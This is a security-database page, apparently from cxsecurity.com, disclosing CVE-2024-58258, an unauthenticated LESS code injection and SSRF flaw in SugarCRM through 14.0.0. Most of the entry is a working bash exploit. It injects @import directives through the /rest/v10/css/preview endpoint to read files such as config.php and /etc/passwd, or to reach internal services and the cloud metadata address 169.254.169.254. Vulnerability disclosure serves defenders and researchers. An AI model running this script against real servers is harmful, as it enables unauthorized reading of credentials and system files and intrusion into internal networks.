---
title: SugarCRM 14.0.0 SSRF/Code Injection
url: https://cxsecurity.com/issue/WLB-2025080008
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2025-08-12
fetch_date: 2025-10-07T00:12:48.718867
---

# SugarCRM 14.0.0 SSRF/Code Injection

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **SugarCRM 14.0.0 SSRF/Code Injection** **2025.08.11**  Credit:  **[Egidio Romano](https://cxsecurity.com/author/Egidio%2BRomano/1/)**  Risk: **Medium**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2024-58258](https://cxsecurity.com/cveshow/CVE-2024-58258/ "Click to see CVE-2024-58258")**  CWE: **[CWE-94](https://cxsecurity.com/cwe/CWE-94 "Click to see CWE-94")** | |

# Exploit Title : SugarCRM 14.0.0 - SSRF/Code Injection
# Author: Egidio Romano aka EgiX
# Email : n0b0d13s@gmail.com
# Software Link: https://www.sugarcrm.com
# Affected Versions: All commercial versions before 13.0.4 and 14.0.1.
# CVE Reference: CVE-2024-58258
# Vulnerability Description:
User input passed through GET parameters to the /css/preview REST API
endpoint is not properly sanitized before parsing it as LESS code. This can
be exploited by remote, unauthenticated attackers to inject and execute
arbitrary LESS directives. By abusing the @import LESS statement, an
attacker can trigger Server-Side Request Forgery (SSRF) or read arbitrary
local files on the web server, potentially leading to the disclosure of
sensitive information.
# Proof of Concept:
#!/bin/bash
echo
echo "+----------------------------------------------------------------------+";
echo "| SugarCRM <= 14.0.0 (css/preview) LESS Code Injection Exploit by EgiX |";
echo "+----------------------------------------------------------------------+";
if [ "$#" -ne 2 ]; then
echo -ne "\nUsage.....: $0 <SugarCRM URL> <Local File or SSRF URL>\n"
echo -ne "\nExample...: $0 'http://localhost/sugarcrm/' 'config.php'"
echo -ne "\nExample...: $0 'http://localhost/sugarcrm/' '/etc/passwd'"
echo -ne "\nExample...: $0 'https://www.sugarcrm.com/' 'http://localhost:9200/\_search'"
echo -ne "\nExample...: $0 'https://www.sugarcrm.com/' 'http://169.254.169.254/latest/meta-data/'\n\n"
exit 1
fi
urlencode() {
echo -n "$1" | xxd -p | tr -d '\n' | sed 's/../%&/g'
}
INJECTION=$(urlencode "1; @import (inline) '$2'; @import (inline) 'data:text/plain,\_\_\_\_\_\_\_\_';//")
RESPONSE=$(curl -ks "${1}rest/v10/css/preview?baseUrl=1&param=${INJECTION}")
if echo "$RESPONSE" | grep -q "\_\_\_\_\_\_\_\_"; then
echo -e "\nOutput for '$2':\n"
echo "$RESPONSE" | sed '/\_\_\_\_\_\_\_\_/q' | grep -v '\_\_\_\_\_\_\_\_'
echo
else
echo -e "\nError: exploit failed!\n"
exit 2
fi
# Credits: Vulnerability discovered by Egidio Romano.
# Original Advisory: http://karmainsecurity.com/KIS-2025-04
# Other References: https://support.sugarcrm.com/resources/security/sugarcrm-sa-2024-059/

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2025080008)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top